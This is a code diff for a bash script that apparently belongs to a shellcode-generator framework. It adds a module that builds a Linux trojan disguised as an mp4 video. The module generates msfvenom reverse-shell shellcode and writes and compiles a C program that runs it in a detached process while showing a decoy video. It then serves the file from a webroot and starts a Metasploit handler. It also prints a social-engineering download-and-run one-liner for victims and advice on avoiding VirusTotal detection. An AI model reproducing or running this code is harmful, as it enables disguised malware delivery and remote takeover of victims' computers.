@@ -8143,6 +8143,171 @@ fi
 
 
 
+#
+# mp4-trojan horse 
+#
+sh_mp4_trojan () {
+# get user input to build shellcode
+echo "[☠] Enter shellcode settings!"
+lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
+paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" FALSE "linux/ppc/shell_reverse_tcp" FALSE "linux/x86/shell_reverse_tcp" TRUE "linux/x86/meterpreter/reverse_tcp" FALSE "linux/x64/shell/reverse_tcp" FALSE "linux/x64/shell_reverse_tcp" FALSE "linux/x64/meterpreter/reverse_tcp" --width 400 --height 300) > /dev/null 2>&1
+appl=$(zenity --title "☠ Chose mp4 file to be backdoored ☠" --filename=$IPATH/bin/mp4/ --file-selection) > /dev/null 2>&1
+mP4=$(zenity --entry --title "☠ MP4 NAME ☠" --text "Enter MP4 output name\nexample: ricky-video" --width 300) > /dev/null 2>&1
+
+echo "[☠] Building agent -> C format .." && sleep 2
+# display final settings to user
+cat << !
+
+    venom settings
+    ╔─────────────────────
+    | LPORT   : $lport
+    | LHOST   : $lhost
+    | FORMAT  : C -> LINUX
+    | PAYLOAD : $paylo
+    | MP4VIDEO: $IPATH/output/stream.mp4
+    |_TROJAN  : $IPATH/output/$mP4.mp4
+
+!
+sleep 1
+# Make sure that the extension provided its .mp4
+ext=$(echo $appl | cut -d '.' -f2)
+if [ "$ext" != "mp4" ]; then
+   echo ${RedF}[x]${white} Abort, NON compatible extension provided:${RedF}.$ext ${Reset};
+   sleep 3 && sh_exit
+fi
+
+# Parse mp4 video name for transformation
+echo "$appl" > /tmp/test.txt
+N4m=$(grep -oE '[^/]+$' /tmp/test.txt) > /dev/null 2>&1
+echo "[☠] rename mp4 from: $N4m To: stream.mp4" && sleep 2
+cp $appl $IPATH/output/stream.mp4 > /dev/null 2>&1
+
+
+# use metasploit to build shellcode (msf encoded)
+echo "[☠] Using msfvenom to build raw C shellcode .." && sleep 2
+xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c -o $IPATH/output/chars.raw"
+echo "[☠] Parsing raw shellcode data (oneliner) .." && sleep 1
+parse=$(cat $IPATH/output/chars.raw | grep -v "=" | tr -d '";' | tr -d '\n' | tr -d ' ')
+echo ""
+echo "unsigned char buf[] ="
+echo "$parse"
+echo ""
+
+
+cd $IPATH/output
+# Build C program (trojan.mp4)
+echo "[☠] Building $mP4.c C Program .." && sleep 2
+echo "#include<stdio.h>" > $mP4.c
+echo "#include<stdlib.h>" >> $mP4.c
+echo "#include<string.h>" >> $mP4.c
+echo "#include<sys/types.h>" >> $mP4.c
+echo "#include<sys/wait.h>" >> $mP4.c
+echo "#include<unistd.h>" >> $mP4.c
+echo "" >> $mP4.c
+echo "/*" >> $mP4.c
+echo "Author: r00t-3xp10it" >> $mP4.c
+echo "Framework: venom v1.0.16" >> $mP4.c
+echo "MITRE ATT&CK T1036 served as Linux RAT agent (trojan)." >> $mP4.c
+echo "gcc -fno-stack-protector -z execstack $mP4.c -o $mP4.mp4" >> $mP4.c
+echo "*/" >> $mP4.c
+echo "" >> $mP4.c
+echo "unsigned char voodoo[] = \"$parse\";" >> $mP4.c
+echo "" >> $mP4.c
+echo "int main()" >> $mP4.c
+echo "{" >> $mP4.c
+echo "   /*" >> $mP4.c
+echo "   This fork(); function allow us to spawn a new child process (in background)." >> $mP4.c
+echo "   Article: https://www.geeksforgeeks.org/zombie-and-orphan-processes-in-c" >> $mP4.c
+echo "   */" >> $mP4.c
+echo "   fflush(NULL);" >> $mP4.c
+echo "   int pid = fork();" >> $mP4.c
+echo "      if (pid > 0) {" >> $mP4.c
+echo "         system(\"sudo /usr/bin/wget -qq http://$lhost/stream.mp4 -O /tmp/stream.mp4 && sudo /usr/bin/xdg-open /tmp/stream.mp4 > /dev/nul 2>&1\");" >> $mP4.c
+echo "      }" >> $mP4.c
+echo "      else if (pid == 0) {" >> $mP4.c
+echo "         /*" >> $mP4.c
+echo "         We are running in child process (as backgrond job - orphan)." >> $mP4.c
+echo "         setsid(); allow us to detach the child (shellcode) from parent (stream.mp4) process," >> $mP4.c
+echo "         allowing us to continue running the shellcode in ram even if parent process its terminated." >> $mP4.c
+echo "         */" >> $mP4.c
+echo "         setsid();" >> $mP4.c
+echo "         void(*ret)() = (void(*)())voodoo;" >> $mP4.c
+echo "         ret();" >> $mP4.c
+echo "      } return 0;" >> $mP4.c
+echo "}" >> $mP4.c
+
+
+## Compile C program
+echo "[☠] Compile C program (MITRE ATT&CK T1036) .." && sleep 1
+gcc -fno-stack-protector -z execstack $IPATH/output/$mP4.c -o $IPATH/output/$mP4.mp4
+echo "[☠] Give execution permitions to agent .." && sleep 1
+chmod +x $IPATH/output/$mP4.mp4 > /dev/null 2>&1
+echo "[☠] Port all files to apache2 webroot .." && sleep 2
+zip $mP4.zip $mP4.mp4 > /dev/null 2>&1
+cp $IPATH/output/$mP4.mp4 $ApAcHe/$mP4.mp4 > /dev/null 2>&1
+cp $IPATH/output/$mP4.zip $ApAcHe/$mP4.zip > /dev/null 2>&1
+cp $IPATH/output/stream.mp4 $ApAcHe/stream.mp4 > /dev/null 2>&1
+cd $IPATH
+
+
+# CHOSE HOW TO DELIVER YOUR PAYLOAD
+serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$mP4.mp4\n\nchose how to deliver: $mP4.mp4" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "oneliner (download/exec)" --width 305 --height 220) > /dev/null 2>&1
+
+
+   if [ "$serv" = "multi-handler (default)" ]; then
+      echo "---"
+      echo "-   DESCRIPTION: This module will ask user to input one mp4 video file, stores it on apache2"
+      echo "-      webroot and builds one C program thats going to download/execute the inputed mp4 video"
+      echo "-      file and at the same time executes our shellcode in a chield process (orphan process)."
+      echo "-"
+      echo "-   ATTACK_VECTOR: sudo ./$mP4.mp4"
+      echo "---"
+      echo -n "[☠] Press any key to start a handler .."
+      read odf
+      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+      echo "[☯] Please dont test samples on virus total..."
+      xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+   else
+      echo "---"
+      echo "-   DESCRIPTION: This module will ask user to input one mp4 video file, stores it on apache2"
+      echo "-      webroot and builds one C program thats going to download/execute the inputed mp4 video"
+      echo "-      file and at the same time executes our shellcode in a chield process (orphan process)."
+      echo "-"
+      echo "-   SOCIAL_ENGINEERING: Get target user (LAN) to execute the next oneliner on terminal."
+      echo "-   ONELINER: sudo wget http://$lhost/$mP4.zip && unzip $mP4.zip && sudo ./$mP4.mp4"
+      echo "---"
+      echo -n "[☠] Press any key to start a handler .."
+      read odf
+      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+      echo "[☯] Please dont test samples on virus total..."
+      xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+   fi
+
+
+# CLEANING EVERYTHING UP
+echo "[☠] Cleanning temp generated files..."
+sleep 2
+rm /tmp/test.txt > /dev/null 2>&1
+rm /tmp/stream.mp4 > /dev/null 2>&1
+rm $ApAcHe/$mP4.mp4 > /dev/null 2>&1
+rm $ApAcHe/$mP4.zip > /dev/null 2>&1
+rm $ApAcHe/stream.mp4 > /dev/null 2>&1
+sleep 2 && sh_menu
+
+
+else
+
+  echo ${RedF}[x]${white} Abort module execution ..${Reset};
+  sleep 2 && sh_menu
+  clear
+fi
+}
+
+
+
+
 
 # -----------------------------------------------------
 # build shellcode in EXE format (windows-platforms)
@@ -10841,6 +11006,7 @@ cat << !
     10        ruby Reverse_bash_shell2      Linux
     11        perl-reverse-shell            Linux|Windows
     12        node.js reverse shell         Windows
+   [ M ]      return to previous menu
 
 !
 sleep 1
@@ -11132,6 +11298,11 @@ read InSh3ll
      zenity --title="☆ SYSTEM built-in SHELLS ☆" --text "Shell Stored Under:\n$IPATH/output/$N4m.js" --info --width 300 > /dev/null 2>&1
      xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
      sleep 2
+
+
+   elif [ "$InSh3ll" = "M" ] || [ "$InSh3ll" = "m" ]; then
+     echo "${YellowF}[!]${white} return to previous menu .."${Reset};
+     sleep 2 && sh_menu
 
 
    else
@@ -11807,10 +11978,18 @@ cat << !
 
     AGENT Nº4:
     ╔──────────────────────────────────────────────────────────────
-    | TARGET SYSTEMS     : Linux
+    | TARGET SYSTEMS     : Linux (htop trojan)
     | SHELLCODE FORMAT   : C
-    | AGENT EXTENSION    : deb
+    | AGENT EXTENSION    : DEB
     | AGENT EXECUTION    : sudo ./agent.deb
+    | DETECTION RATIO    : https://goo.gl/naohaainda
+
+    AGENT Nº5:
+    ╔──────────────────────────────────────────────────────────────
+    | TARGET SYSTEMS     : Linux (mp4 trojan)
+    | SHELLCODE FORMAT   : C
+    | AGENT EXTENSION    : MP4
+    | AGENT EXECUTION    : sudo ./ricky-video.mp4
     | DETECTION RATIO    : https://goo.gl/naohaainda
 
 
@@ -11830,6 +12009,7 @@ case $choice in
 2) sh_shellcode20 ;;
 3) sh_elf ;;
 4) sh_debian ;;
+5) sh_mp4_trojan ;;
 m|M) sh_menu ;;
 e|E) sh_exit ;;
 *) echo ${RedF}[x]${white} "$choice": is not a valid Option${Reset}; sleep 2; clear; sh_unix_menu ;;
